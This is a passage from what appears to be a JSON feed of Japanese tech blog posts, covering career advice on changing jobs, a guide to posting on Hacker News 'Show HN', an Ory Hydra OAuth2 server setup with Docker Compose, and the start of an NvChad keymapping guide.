果が出せていたのに、新しい環境では1人で同じ成果を求められる。結果、評価が下がり、居心地が悪くなる。中には、年収ダウンで再び転職した人もいた。年収アップの転職で失敗する人には、共通点があった。「年収が上がる＝自分の価値が認められた」と解釈していたことだ。でも、採用側の論理は違う。「この年収を払えば、このくらいの成果が出るはずだ」という投資判断をしている。年収は「認定」ではなく「期待値」なのだ。その期待値に応えられなければ、厳しい現実が待っている。ここで、提示された年収アップのオファーについて冷静に考えてほしい。その年収は、あなたの「現在の実力」に対する評価なのか。それとも、市場のバブルや採用の緊急度による「プレミアム（下駄）」なのか。下駄を履いた状態で入社すると、期待値の調整で苦しむ。「このくらいできるだろう」という期待に応えられず、評価が下がり、居心地が悪くなる。そのリスクをどう管理するか。年収だけを見て決めると、この罠にはまりやすい。だから、「年収を上げるために転職する」のではなく、「能力を上げた結果として年収が上がる」という順序を間違えてはいけない。そして、能力を上げるためには、今の環境で何ができるかをまず考えるべきだ。ここで、転職を考えるときに気をつけてほしいことがある。「年収アップ」という言葉に惹かれて、転職エージェントの話を聞き始める人は多い。だが、エージェントの言葉を聞く前に、知っておくべきことがある。転職エージェントのビジネスモデルを理解する転職エージェントは、あなたの味方ではない。これは悪口ではなく、ビジネスモデルの話だ。転職エージェントにお金を払っているのは、あなたではない。採用企業だ。エージェントは、あなたを企業に紹介し、採用が決まったときに、企業から報酬を受け取る。その報酬は、あなたの年収の一定割合だ。つまり、エージェントにとって、あなたが「転職すること」が利益になる。あなたが「現職に残ること」は、彼らには何のメリットもない。むしろ、売上ゼロだ。だから、エージェントは転職を勧める。「今の会社に残った方がいい」とは、なかなか言ってくれない。彼らの言葉をそのまま鵜呑みにするのは危険だ。エージェントを使うなとは言わない。彼らは市場の情報を持っているし、面接対策のアドバイスもくれる。ただ、彼らのインセンティブ構造を理解した上で、話を聞くべきだ。本当に転職すべきかどうかは、エージェントではなく、あなた自身が決めることだ。できれば、利害関係のない第三者——信頼できる先輩、友人、メンター——に相談してほしい。ここで厳しいことを言う。自分のキャリアの最終責任者になれ。日本企業では、「会社がキャリアパスを用意してくれる」という期待がある。年功序列で昇進できる。上司が適切なアサインメントを考えてくれる。人事部がキャリア相談に乗ってくれる。——しかし、それは幻想だ。あなたのキャリアの最終責任者は、上司やエージェントや人事部ではなく、あなた自身だ。誰かが導いてくれるのを待つのではなく、自分で方向を決めて、自分で動く。その覚悟があるかどうかが、キャリアを作れるかどうかの分かれ目になる。自分でキャリアを管理するために、私が大事にしている習慣が2つある。1つは、時間管理より体力管理だ。同じ1時間でも、元気なときと疲れているときでは、アウトプットが全く違う。燃え尽きそうな状態で長時間働いても、成果は出ない。自分の体力がどこで回復し、どこで消耗するかを把握することが、長く働き続けるための鍵だ。もう1つは、フィードバックを受け入れる力だ。「それは違うと思います」と言われたとき、どう反応するか。防御的にならず、「なるほど、そういう見方もあるのか」と学びに変えられる人が、成長し続けられる。「自分は正しい」と固まった人は、どんなに優秀でも、そこで成長が止まる。ここまで、「辞めるな」「考えろ」と書き続けてきた。読んでいて息苦しくなった人もいるかもしれない。だから、バランスを取っておきたい。転職が正解だったケースも、確かにあるからだ。転職して正解だった人たちここまで「辞めるな」と書いてきたが、一方的になりすぎただろう。転職して正解だった人も、たくさんいる。私の知り合いにも、転職がキャリアの転機になった人がいる。大企業からスタートアップに移って、2年で技術力が飛躍的に伸びた人。逆に、スタートアップから大企業に移って、大規模開発の経験を積んだ人。マネジメント志向だったのに、転職先でスペシャリストとして開花した人もいる。1人の話をしよう。彼は大企業で5年間、安定したキャリアを積んでいた。評価も悪くなかった。でも、「このまま10年後も同じことをしているのか」という問いが、ずっと頭の片隅にあったという。彼が転職を決めたのは、「逃げたい」からではなかった。「自分の手でプロダクトを作りたい」という明確な欲求があった。大企業では、どうしても歯車の一部になる。意思決定に関われるのは、ずっと先の話だ。彼は、その「ずっと先」を待てなかった。転職先は、20人規模のスタートアップだった。最初の3ヶ月は地獄だったと言っていた。前職では当たり前だったインフラが何もない。ドキュメントもない。聞ける人もいない。「俺、何やってるんだろう」と思った夜もあったらしい。でも、半年後に変化が起きた。自分が設計したアーキテクチャが、本番環境で動き始めた。ユーザーからのフィードバックが、直接Slackに届くようになった。「自分の仕事が、誰かの役に立っている」——その実感が、すべてを変えたと言っていた。彼が転職で成功したのは、運が良かったからではない。辞める前に、「次に何を得たいか」が明確だったからだ。「今の環境が嫌だから」ではなく、「次の環境でこのスキルを得たい」「この経験を積みたい」という具体的な理由で動いていた。これは、私が見てきた「転職で成功した人たち」に共通する特徴だ。ここで視点を切り替えてみたい。「今の仕事への期待値は下げ、キャリアにはもっと期待しよう」。今の仕事で完璧を求めすぎない。すべての仕事が理想的であるはずがない。でも、キャリア全体では高い目標を持つ。3年後、5年後にどうなっていたいか。この視点の切り替えが、良い転職をした人たちの特徴だった。そして、もう1つ。彼らは辞める前に、現職でやれることをやり切っていた。「ここでやれることはやった」という実感があった。だからこそ、次の環境で活かせる実績と経験を持って移れた。転職が正解になるかどうかは、転職先の問題ではない。辞める前に何を積み上げたかの問題だ。だから、この記事で伝えたいのは「絶対に辞めるな」ではない。「辞める準備はできているか」を問え、ということだ。ただし、ここで1つ付け加えておきたい。準備とは関係なく、すぐに辞めるべきときがある。そのタイミングを見誤ると、取り返しのつかないことになる。それでも辞めるべきタイミングここまで「辞めるな」と書いてきた。でも、辞めるべきタイミングは確かにある。そして、それは「自分の問題」ではなく、「環境の問題」であることも多い。メンタルや身体が壊れそうなときは、今すぐ辞めろ。これだけは絶対だ。キャリアよりも健康が大事だ。あなた個人に対するリスペクトを感じない会社や現場からは、即刻立ち去るべきだ。そこで無理をする必要はない。一方的に消耗させられる必要もない。我慢して壊れてからでは遅い。組織の構造的問題があるときも、辞めていい。これは重要なポイントだ。個人の努力では変えられない問題が、組織には存在する。いくつか例を挙げる。評価制度が機能していない——成果を出しても正当に評価されない。声が大きい人だけが昇進する。透明性がない。技術的負債が放置されている——経営層が技術投資を理解せず、ひたすら機能追加だけを求める。改善の余地がない。権限と責任が一致しない——責任だけ押し付けられて、決定権がない。何を提案しても却下される。人間関係の構造が壊れている——特定の人物によるハラスメント。派閥争い。コミュニケーションの断絶。会社の方向性に共感できない——ビジョンが見えない。または、見えたビジョンが自分の価値観と合わない。これは、あなたの責任ではない。どんなに努力しても、個人で変えられない問題はある。「もっと頑張れば変えられるはず」と思って消耗し続ける必要はない。構造的問題を個人の努力で乗り越えようとするのは、無理ゲーだ。今の環境で目指す役割に挑戦する機会がどうしても得られないときも、辞め時だ。組織の構造上、テックリードのポジションがない。マネジメントのポジションがない。専門性を深める機会がない。そういう時は、環境を変える必要がある。私が辞め時だと思う明確なサインがある。「学びたい意欲はあるのに、実際には学べていない」状態だ。技術を深めたい、新しいことに挑戦したい——その気持ちはある。でも、日々の仕事は同じことの繰り返し。成長の機会がない。もう1つのサインは、「スキルではなく、対処法を学んでいる」状態だ。技術力が上がっているのではなく、「この上司にはこう報告すればいい」「この会議はこうやり過ごせばいい」という政治的なサバイバルスキルばかりが磨かれている。これは危険信号だ。その環境で得られるものは、もう得尽くした可能性が高い。しかし、一点だけ確認してほしい。本当に機会がないのか、自分が機会を見逃していないか。機会は待っていても来ない。自分で作り出すものだ。作り出そうとしたけど本当に無理だった——そう言えるなら、転職は正しい選択だ。一方で、こういう時は立ち止まってほしい。「なんとなく飽きた」「刺激がない」「成長できない気がする」——こういう漠然とした不満だけで辞めようとしているなら、一度考えてみてほしい。それは本当に環境の問題なのか。自分の姿勢の問題ではないのか。辞める理由が「環境の構造的問題」なら、辞めていい。辞める理由が「自分の漠然とした不満」なら、もう少し掘り下げてみてほしい。その違いを見極めることが大事だ。ここで1つ、厳しい問いを投げかけたい。「この会社では無理だ」という結論に至るまでに、組織のボトルネックに対して具体的な改善提案や行動を何回試みたか。「評価制度がおかしい」と感じたなら、上司やHRに具体的な改善案を提案したか。「技術的負債が放置されている」と感じたなら、解消のためのロードマップを作って経営層に説明したか。試行回数がゼロなら、それは「構造の問題」ではなく「食わず嫌い」かもしれない。失敗してもいいから、一度は試みてほしい。試みた上で無理だったなら、辞める判断は正しい。ここまで、様々な角度から転職について考えてきた。辞めるべきとき、辞めるべきでないとき、その判断基準を見てきた。最後に、これまでの内容を整理して、問いかけの形にまとめておきたい。転職を決断する前に転職を考えているあなたに、最後に問いかけたい。まず、方向性は明確か。テックリードを目指すのか、EMを目指すのか、スペシャリストとして深掘りするのか。次に進みたい方向が言語化できていなければ、転職は単なる「移動」に終わる。技術力、推進力、影響力のうち、今の自分に足りないものは何か。それを伸ばす機会が、本当に今の環境にはないのか。転職すれば自動的に成長できるわけではない。次に、積み上げたものを使い切ったか。転職には必ずリセットコストがかかる。信頼の貯金はゼロに戻る。ドメイン知識も、人間関係も、リセットされる。その代償を払ってでも得たいものは何か。今の会社で、信頼の貯金を活用してできる挑戦はもうないのか。信頼があるからこそ任される大きな仕事を、やり残していないか。現職で主体的に動いて成し遂げた実績を語れるか。「自分がいたからこそ生まれた差分」を説明できるか。そして、冷静に判断できているか。「成長できない」のは本当に環境のせいか。それとも、難しい課題から逃げているだけではないか。転職理由が「年収を上げたい」だけになっていないか。年収は結果であって、目的ではない。転職エージェントのアドバイスを鵜呑みにしていないか。彼らは転職させることでお金をもらっている。利害関係のない第三者——信頼できる先輩、友人、メンター——に相談したか。「一人前の開発者」から次のステージに進めているか。それとも、キャッチアップを繰り返しているだけではないか。すべてに明確な答えを持っている必要はない。だが、1つも考えたことがないなら、まだ転職を決断する段階ではない。おわりにこの記事で言いたかったことは、結局、1つだけだ。短期的にモノを考えるな。目の前の不満。今月の年収。来週の上司との関係。そういうものに振り回されて、衝動的に決断するな。3年後、5年後、10年後の自分がどうなっていたいか。そこから逆算して考えろ。若いエンジニアが短期的に考えてしまうのは、仕方がない。私もそうだった。目の前の不満が世界のすべてに見える。「今すぐ環境を変えたい」という衝動を抑えられない。それは、若さゆえの特権でもある。でも、その特権には代償がある。転職を繰り返すたびに、信頼の貯金はリセットされる。キャリアの複利は止まる。「いろんな経験を積んだ」と言えば聞こえはいいが、どこにも根を張れないまま、年齢だけが積み上がっていく。私は、そういう未来を避けたかった。転職は、逃げにもなるし、飛躍にもなる。同じ「辞める」という行動でも、その意味は正反対になりうる。違いを決めるのは、辞める前に何を考えたか。それだけだ。1つだけ、問いを残しておく。もし今の会社の嫌な部分——人間関係や評価制度——がすべて解消されたとしたら、それでもなお、その新しい会社に行きたいと心から思えるか。YESなら、それは「攻め」の転職だ。NOなら、それは高度に正当化された「逃げ」かもしれない。逃げが悪いとは言わない。ただ、逃げを「攻め」の物語ですり替えていないか、正直な気持ちで自分に問いかけてほしい。深夜2時、ベッドの中で転職サイトを開いたとき。その衝動を否定はしない。ただ、その衝動のまま動くな。翌朝、もう一度考えろ。1週間後、もう一度考えろ。それでもなお、辞めたいと思うなら、そのときは辞めればいい。正直に言えば、「正解」なんてない。辞めても、残っても、どちらが正しかったかは、誰にも分からない。分かるのは、ずっと後になってからだ。そして、その「正しさ」は、最初から存在していたわけではない。選んだ道を、正解にしていく過程があるだけだ。おい、考えろ。短期ではなく、長期で考えろ。そして、選んだら、それを正解にしろ。続編を書きました。syu-m-5151.hatenablog.com参考書籍ＩＴエンジニアの転職学　２万人の選択から見えた、後悔しないキャリア戦略 (ＫＳ科学一般書)作者:赤川朗講談社Amazon社内政治の科学　経営学の研究成果 (日本経済新聞出版)作者:木村琢磨日経BPAmazon社内政治の教科書作者:高城 幸司ダイヤモンド社Amazonスタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazonスタッフエンジニアの道 ―優れた技術専門職になるためのガイド作者:Tanya Reillyオーム社AmazonNINE LIES ABOUT WORK　仕事に関する９つの嘘作者:マーカス・バッキンガム,アシュリー・グッドールサンマーク出版Amazon世界標準のフィードバック　部下の「本気」を引き出す外資流マネジメントの教科書作者:安田 雅彦SBクリエイティブAmazonみんなのフィードバック大全作者:三村 真宗光文社Amazonネガティブフィードバック　「言いにくいこと」を相手にきちんと伝える技術作者:難波 猛アスコムAmazonロバート・キーガンの成人発達理論――なぜ私たちは現代社会で「生きづらさ」を抱えているのか作者:ロバート・キーガン,中土井僚,鈴木規夫英治出版Amazon「人の器」の磨き方　リーダーシップ・コーチングと成人発達理論による人間力の変容プロセス作者:加藤洋平,中竹竜二日本能率協会マネジメントセンターAmazon「人の器」を測るとはどういうことか　成人発達理論における実践的測定手法作者:オットー・ラスキー,中土井僚日本能率協会マネジメントセンターAmazon組織も人も変わることができる！　なぜ部下とうまくいかないのか　「自他変革」の発達心理学作者:加藤洋平日本能率協会マネジメントセンターAmazon人が成長するとは、どういうことか作者:鈴木規夫日本能率協会マネジメントセンターAmazonあなたはなぜ雑談が苦手なのか（新潮新書）作者:桜林直子新潮社Amazon世界の一流は「雑談」で何を話しているのか作者:ピョートル・フェリクス・グジバチクロスメディア・パブリッシング（インプレス）Amazon「何を話していいかわからない」がなくなる　雑談のコツ作者:ひきた よしあきアスコムAmazon雑談の一流、二流、三流作者:桐生 稔明日香出版社Amazon雑用は上司の隣でやりなさい――あなたの評価を最大限に高める「コスパ最強」仕事術作者:たこすダイヤモンド社Amazon資本主義が人類最高の発明である：グローバル化と自由市場が私たちを救う理由作者:ヨハン・ノルベリニューズピックスAmazon資本主義は私たちをなぜ幸せにしないのか (ちくま新書)作者:ナンシー・フレイザー,江口泰子筑摩書房Amazon資本主義はなぜ限界なのか　――脱成長の経済学 (ちくま新書)作者:江原慶筑摩書房Amazon資本主義にとって倫理とは何か作者:ジョセフ・ヒース,瀧澤弘和慶應義塾大学出版会Amazon","isoDate":"2026-01-05T00:00:20.000Z","dateMiliSeconds":1767571220000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Hacker NewsのShow HN に自作ツールを投稿する方法 ","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/04/141622","contentSnippet":"はじめにHacker News の「Show HN」は、自分が作ったものを開発者コミュニティに紹介できる場だ。しかし、ただ URL を貼れば良いわけではない。明確なルールがあり、それを守らないと投稿が埋もれたり、他のユーザーから通報されて非表示になることもある。この記事では、Show HN のルールを読み解き、効果的な投稿を作成するまでのプロセスを解説する。Show HN とは何かShow HN は Hacker News 内の特別なカテゴリで、自分が作ったものを他の人が試せる形で共有する場所だ。通常の HN 投稿がニュースや記事のシェアであるのに対し、Show HN は「触れるもの」を紹介する。投稿が一定のポイントを獲得すると、トップバーの \\"show\\" ページに表示され、より多くの人の目に触れる。ルールを正確に理解するShow HN には明確なルールがある。公式ガイドラインから重要なポイントを抜粋する。news.ycombinator.com投稿できるものユーザーが実際に試せるもの（run on their computers or hold in their hands）ハードウェアの場合は動画や詳細な記事でも可書籍の場合はサンプルチャプターでも可投稿できないものブログ記事サインアップページニュースレターリスト記事その他「読むだけ」のコンテンツこれらは「試せない」ため Show HN の対象外だ。通常の投稿として submit すべき。その他の重要なルール自分が関わったプロジェクトであること議論に参加できる状態であることサインアップやメール登録なしで試せるのが理想準備ができていないなら投稿しない（ready になってから来い）ランディングページや資金調達ページは NG友人に upvote や comment を頼むのは禁止（組織的な票操作とみなされる）マイナーアップデート（Foo 1.3.1 is out）は NG、メジャーオーバーホールなら可投稿フォームの構成Show HN の投稿は3つの要素で構成される。1. Title（タイトル）Show HN: で始める必要がある80文字制限がある（超過するとエラー）プロジェクト名と一言説明を入れる2. URLプロジェクトのリポジトリ、デモサイト、またはドキュメントページユーザーがすぐに試せる URL が理想3. Text（オプション）URL を補足する説明文何を作ったか、なぜ作ったか、どう使うかフィードバックを求めるポイントを明示すると反応が得やすい効果的なタイトルの作り方80文字という制限の中で、以下を伝える必要がある。プロジェクト名 — 何と呼ばれているか何をするものか — 一言で説明差別化ポイント（余裕があれば） — なぜこれが面白いかタイトルのパターンShow HN: [プロジェクト名] – [一言説明]文字数を削るテクニック：- 冠詞（a, an, the）を省略- \\"for\\" を \\"–\\" に置き換え- 形容詞を削る- 技術用語は略称を使う（もし一般的なら）良いタイトルの例Show HN: Helix – A post-modern text editor written in RustShow HN: Zed – A high-performance code editor from the creators of AtomShow HN: DuckDB – An embeddable SQL OLAP database management system避けるべきタイトルShow HN: My new project that I\'ve been working on for 6 months  ← 情報がないShow HN: Check this out!  ← 何かわからないShow HN: Tool v1.3.2 released  ← マイナーアップデートは NGText（説明文）の書き方Text は任意だが、書いた方が反応は良くなる。以下の構成が効果的：1. 何を作ったか（1-2文）I built a [種類] that [主要機能].2. なぜ作ったか / 何が新しいか（2-3文）既存ツールとの違い、解決した課題、採用した理論やアプローチ。3. 使い方（1-3行）Quick start:  npm install -g mytool  mytool initワンライナーで試せると理想的。4. 主要機能（箇条書き、3-5個）Features:- Feature A- Feature B- Feature C5. フィードバックの呼びかけ（1文）Would love feedback on [具体的なポイント].「フィードバックください」だけでなく、何について聞きたいかを明示すると、具体的なコメントが得やすい。実際の投稿準備プロセスStep 1: ルールの確認まず公式ガイドラインを読む。ルールは時々更新されるため、投稿前に毎回確認するのが安全。news.ycombinator.comStep 2: 素材の整理プロジェクトの URLREADME や説明文主要機能のリストインストール方法Step 3: タイトルの作成80文字制限を意識しながら複数案を作成。文字数カウンターを使って確認する。Step 4: Text の作成上記の構成に沿って簡潔に。長すぎると読まれない。Step 5: 投稿タイミングHN のトラフィックは米国時間の午前中（太平洋時間 6-10 AM）がピーク。日本時間だと夜〜深夜にあたる。AI を活用した投稿準備Show HN の投稿準備は、AI アシスタントとの相性が良い。依頼の例https://news.ycombinator.com/showhn.html のルールに沿って、https://github.com/username/project を Show HN に投稿したい。タイトル、URL、テキストを作成してほしい。AI に依頼する際のポイント：ルールの URL を渡す — AI が最新のルールを参照できるプロジェクトの URL を渡す — README から情報を抽出してもらえる文字数制限を伝える — 80文字制限など、具体的な制約を共有AI が生成した案をそのまま使うのではなく、自分の言葉で調整することで、より自然な投稿になる。投稿後の対応Show HN では投稿者がコメントに返信することが期待されている。質問には丁寧に回答批判的なコメントにも建設的に対応バグ報告には感謝を伝え、対応する姿勢を見せる投稿して放置するのは印象が悪い。数時間はコメントを監視できるタイミングで投稿しよう。まとめShow HN への投稿は、単なる宣伝ではなく、開発者コミュニティとの対話の始まりだと思います。ルールを守る — 「試せるもの」を投稿するタイトルは80文字以内 — プロジェクト名 + 一言説明Text で文脈を与える — 何を、なぜ、どう使うかフィードバックポイントを明示 — 具体的な質問を投げかける投稿後は対話する — コメントに返信する","isoDate":"2026-01-04T05:16:22.000Z","dateMiliSeconds":1767503782000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Ory HydraでOAuth2認可サーバーを構築する","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/04/133007","contentSnippet":"はじめに認可サーバーを構築するタスクがアサインされた。技術選定の裁量はある。仕事の合間にRFC 6749や技術書をいくつか読み始めた。datatracker.ietf.org帰宅後の深夜、週末の空き時間。3日目の深夜2時、私は確信した。これは自前で作るべきではない。認可コードフロー、インプリシットフロー、リソースオーナーパスワードクレデンシャル、クライアントクレデンシャル。4つのグラントタイプ。それぞれにセキュリティ要件がある。PKCEも必要だ。OpenID Connectも。IDトークンのクレーム設計。JWKSエンドポイント。セッション管理。トークン失効。リフレッシュトークンのローテーション。仕様を読めば理解できる。実装もできる。でも、これをプロダクション品質で検証し続けるのは、私たちの仕事ではない。3日間RFCを読んで分かったのは、「自前で作ることの非合理性」だった。調べていく中で、OpenAIがOryを採用していることを知った。www.ory.com彼らは認可サーバーの実装に時間を使わないことを選んだ。彼らの本業はAIモデルの開発だ。認証認可は重要だが、「解くべき問題」ではなく「解決済みの問題を使う」領域として扱っている。妥当な判断だと思う。Ory Hydraを採用することにした。www.ory.shgithub.comこの記事では、Hydraのアーキテクチャを解説し、Docker Composeで実際に動かすところまでやる。OAuth2/OIDCの基本概念は知っている前提で進める。OAuth徹底入門 セキュアな認可システムを適用するための原則と実践作者:Justin Riche,Antonio Sanso翔泳社AmazonOAuth 2 in Action (English Edition)作者:Richer, Justin,Sanso, AntonioManningAmazonこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。「認証をしない認可サーバー」という話www.ory.comHydraのドキュメントを読んでいて、ある一文で手が止まった。「Hydraは認証をしません」認可サーバーなのに認証しない。最初は設計の欠落かと思った。Auth0やKeycloakは全部やってくれるのに。だが、ドキュメントを読み進めるうちに意図が見えてきた。これは欠陥ではない。これこそが設計の核心だ。考えてみてください。あなたの会社には、おそらく既にユーザーデータベースがある。10年使ってきた認証システムがある。LDAPで認証している。多要素認証は自前のものを使っている。パスキー対応も進めている。一般的なIdP——Auth0やKeycloak——を導入すると、これらを全部IdP側に合わせなければなりません。データ移行。認証フローの再設計。既存システムとの複雑な連携。Hydraは違うアプローチを取ります。「認証はあなたたちでやってください。終わったら教えてくれれば、あとはこちらでOAuth2/OIDCの面倒なことは全部やります」この瞬間、私の中で何かがカチッとはまりました。既存の認証システムはそのまま。ユーザーDBもいじらない。ただ、OAuth2/OIDCのプロトコル層だけをHydraに任せる。認証と認可の責務が完全に分離される。これが「ヘッドレス」な認可サーバーというコンセプトです。具体的には以下のメリットがあります。既存システムはそのまま使える: ユーザーDB・認証ロジックをいじらなくていい認証方法は完全に自由: パスワード、パスキー、生体認証、なんでもHydraが担保するのはプロトコル準拠: OpenID Connect Certificationを取得済みhttps://openid.net/certification/openid.netアーキテクチャの全体像www.ory.comHydraを使ったシステムは、3つのコンポーネントで構成されます。Hydra Public API（ポート4444）はOAuth2/OIDCの「顔」です。クライアントアプリケーションが/oauth2/authに認可リクエストを投げ、/oauth2/tokenでトークンを受け取る。ここはHydraが全部やってくれます。Login/Consent Provider（ポート3000）が私たちの実装領域です。Hydraからリダイレクトされてきたユーザーに対して、/loginで認証画面を、/consentで同意画面を表示します。「このユーザーは本人か？」「このスコープを許可するか？」という判断を担う。ここに既存の認証ロジックを組み込みます。Hydra Admin API（ポート4445）は裏方です。Login/Consent Providerが認証・同意の結果をHydraに通知するために使います。チャレンジの検証、承認の通知、セッション管理を担当します。外部には公開せず、内部ネットワークからのみアクセスさせます。この構成を理解したとき、肩の荷が下りた気がしました。OAuth2/OIDCの複雑な部分はHydraに任せて、自分たちは「認証」という本質的な部分だけに集中できる。これなら、やれそうだ。チャレンジベースのフローwww.ory.comHydraとProviderの連携には「チャレンジ」という仕組みが使われます。最初は「なんで直接やり取りしないんだろう」と思いました。でも、この設計にはちゃんと理由があります。クライアントがHydraの/oauth2/authにリダイレクトHydraがlogin_challengeを生成し、Login ProviderにリダイレクトLogin Providerはlogin_challengeを検証し、ユーザーを認証認証成功後、Admin APIで承認を通知し、Hydraに戻るHydraがconsent_challengeを生成し、Consent ProviderにリダイレクトConsent Providerはスコープを確認し、Admin APIで承認クライアントに認可コードが返されるチャレンジは一度きりの使い捨てトークンです。傍受されても再利用できない。リプレイ攻撃やセッションハイジャックを構造的に防ぎます。この手のセキュリティ上の細かい配慮——正直、自前実装だと見落としがちだ。PKCEのcode_verifierの長さ制限（43-128文字）。stateパラメータに暗号学的に安全な乱数を使うべきこと。RFCを読んでいたあの3日間で、攻撃ベクトルをどれだけ考慮できていたか。Hydraはこれらをすべて内包しています。OpenID Connect Certificationを取得しているということは、私が見落としていたであろう細部まで検証されているということです。Docker Compose環境の構築www.ory.com理論は十分。実際に動かしてみましょう。OAuth2/OIDCの仕様は複雑です。RFC 6749を読んでも、認可コードフローの全体像が頭に入らなかった。実際にcurlでリクエストを投げ、リダイレクトを追いかけることで、初めて仕様書の抽象的な記述が腑に落ちました。開発環境は4つのサービスで構成されます。HydraのDockerイメージは公式で提供されています。hub.docker.comservices:  postgres:    image: postgres:16-alpine    environment:      POSTGRES_USER: hydra      POSTGRES_PASSWORD: secret      POSTGRES_DB: hydra    volumes:      - postgres_data:/var/lib/postgresql/data    healthcheck:      test: [\\"CMD-SHELL\\", \\"pg_isready -U hydra -d hydra\\"]      interval: 5s      timeout: 5s      retries: 5  hydra-migrate:    image: oryd/hydra:v2.2    environment:      DSN: postgres://hydra:secret@postgres:5432/hydra?sslmode=disable    command: migrate sql -e --yes    depends_on:      postgres:        condition: service_healthy  hydra:    image: oryd/hydra:v2.2    environment:      DSN: postgres://hydra:secret@postgres:5432/hydra?sslmode=disable      SECRETS_SYSTEM: super-secret-system-secret-at-least-32-chars      URLS_SELF_ISSUER: http://localhost:4444      URLS_CONSENT: http://localhost:3000/consent      URLS_LOGIN: http://localhost:3000/login      URLS_LOGOUT: http://localhost:3000/logout      LOG_LEVEL: debug    command: serve all --dev    ports:      - \\"4444:4444\\"      - \\"4445:4445\\"    depends_on:      hydra-migrate:        condition: service_completed_successfully    healthcheck:      test: [\\"CMD\\", \\"wget\\", \\"-q\\", \\"--spider\\", \\"http://localhost:4444/health/ready\\"]      interval: 10s      timeout: 5s      retries: 5  auth-provider:    build: .    environment:      HOST: 0.0.0.0      PORT: 3000      HYDRA_ADMIN_URL: http://hydra:4445      RUST_LOG: ory_hydra_rust=debug,tower_http=debug    ports:      - \\"3000:3000\\"    depends_on:      hydra:        condition: service_healthyvolumes:  postgres_data:注意: 上記の設定は開発環境用です。本番環境ではSECRETS_SYSTEMに32文字以上の暗号学的に安全な値を設定し、sslmode=disableはrequireに変更してください。docs.docker.comauth-providerサービスのbuild: .は、Login/Consent ProviderのDockerfileを参照しています。このDockerfileとRust実装は次回の記事で解説します。今回はHydraのアーキテクチャ理解に集中しましょう。サンプルコードは以下のリポジトリで公開しています。https://github.com/nwiizo/workspace_2026/tree/main/samples/ory-hydra-rustgithub.comdepends_onとhealthcheckの組み合わせがポイントです。PostgreSQL → マイグレーション → Hydra → auth-providerという起動順序が保証されます。私は最初これを書かずに「DBがない」エラーで30分悩みました。環境の起動と動作確認docker compose up -d --builddocker compose logs -f auth-providerヘルスチェック用エンドポイントにアクセスしてみます。curl http://localhost:3000/health# {\\"status\\":\\"healthy\\"}{\\"status\\":\\"healthy\\"}が返ってきた。たった数十行のdocker-compose.ymlで、OAuth2認可サーバーの基盤が動いている。RFCを読んでいたあの3日間で見えた複雑さが、Hydraの中に隠蔽されている。OAuth2クライアントの登録OAuth2フローをテストするには、まずクライアントを登録します。www.ory.shdocker compose exec hydra hydra create oauth2-client \\\\  --endpoint http://localhost:4445 \\\\  --grant-type authorization_code \\\\  --response-type code \\\\  --scope openid,offline_access,profile,email \\\\  --redirect-uri http://localhost:8080/callback \\\\  --name \\"Test Client\\"クライアントIDとシークレットが出力されるので控えておきます。OAuth2フローのテストテストユーザーを作成します。curl -X POST http://localhost:3000/api/auth/register \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"email\\": \\"test@example.com\\", \\"password\\": \\"password123\\"}\'ブラウザで認可エンドポイントにアクセスします（<CLIENT_ID>は先ほど取得したもの）。http://localhost:4444/oauth2/auth?client_id=<CLIENT_ID>&response_type=code&scope=openid+profile+email&redirect_uri=http://localhost:8080/callback&state=random_stateフローは以下のように進みます。Hydraがログイン画面にリダイレクトメールアドレスとパスワードを入力してログインHydraが同意画面にリダイレクトスコープを確認して同意http://localhost:8080/callback?code=...にリダイレクトリダイレクト先（8080）は存在しなくても構いません。URLから認可コードを取得できれば成功です。おわりにこの記事を書き終えて、時計を見た。深夜1時だ。正直に言うと、書いている途中で何度かRFCのタブを開いてしまった。「この説明で合ってるかな」と不安になって。私はこの記事を書いたからといって、OAuth2/OIDCを完全に理解したわけではない。たぶん来週も、仕様書の細部で「あれ？」となる瞬間がある。でも、少しだけ違うことがある。3日目の深夜2時、RFCのタブを20個開いて、私は判断した。これは自前で作るべきではない、と。仕様は理解できる。実装もできる。でも、プロダクション品質で検証し続けることは、私たちの仕事ではない。Hydraのアーキテクチャを理解して、Docker Composeで動かしてみて、その判断が正しかったと確信した。認証と認可は分離できる。複雑なプロトコル層は、検証済みの実装に任せていい。私が書くべきコードは、真ん中の「Login/Consent Provider」だけだ。「認可サーバーを自前で作ってくれ」もしあなたが今、この言葉を受けてRFCを読んでいるなら。3日読めば分かる。作れるかどうかではない。作るべきかどうかだ。RFCを読むことには意味がある。私もあの3日間があったから、Hydraの設計思想が腑に落ちた。でも、プロダクション品質の認可サーバーを一人で検証し続ける必要はない。検証済みの実装がある。明日の朝、目覚ましが鳴る。また仕事が始まる。おい、RFCのタブを閉じろ。Hydraのドキュメントを開け。何度でも思い出せることの方が大事だ。次の記事では、RustでLogin/Consent Providerを実装する。一緒に認証画面を作ろう。","isoDate":"2026-01-04T04:30:07.000Z","dateMiliSeconds":1767501007000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"私の為のNvChadのキーマッピングガイド 2026年版","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/03/002621","contentSnippet":"はじめに一月三日である。私は今、ソファの深淵に身を沈め、己の怠惰と対峙しているところである。年末にやろうと固く心に誓った開発環境の整理は、見事なまでに手つかずのまま新年を迎えてしまった。大掃除もしていない。年賀状も書いていない。結婚もしていないし、友人と過ごす予定もなかった。やらなかったことを指折り数えていると、正月休みの大半が、まるで人生の棚卸しのような様相を呈し、胸中は罪悪感で満たされていくのである。「年末年始は何をしていたのか」と問われれば、私は途方に暮れるほかない。身体は動かしていない。コードは書いた。本を読み、近所を散歩した。であるから、休んだと言えば休んだのであろう。しかしながら、休んだという実感が皆無なのである。なぜか。「あのキーバインド、なんだったか」という問いが、四六時中、頭蓋骨の内側をぐるぐると巡り続けていたからに相違ない。私はNvChadを使っている。かれこれ四年ほど使い続けている。それにもかかわらず、半年ぶりに設定を見直すたびに「これ、なんのキーだったか」と首を傾げてしまうのである。設定ファイルには丁寧にコメントを書いてある。過去の自分が、未来の自分のために残してくれた親切なメモである。しかし、読んでも思い出せない。覚えた数だけ忘れている。どうやら人間の脳というものは容量が有限であり、Vimのキーバインドよりも優先して記憶すべき事柄があるらしい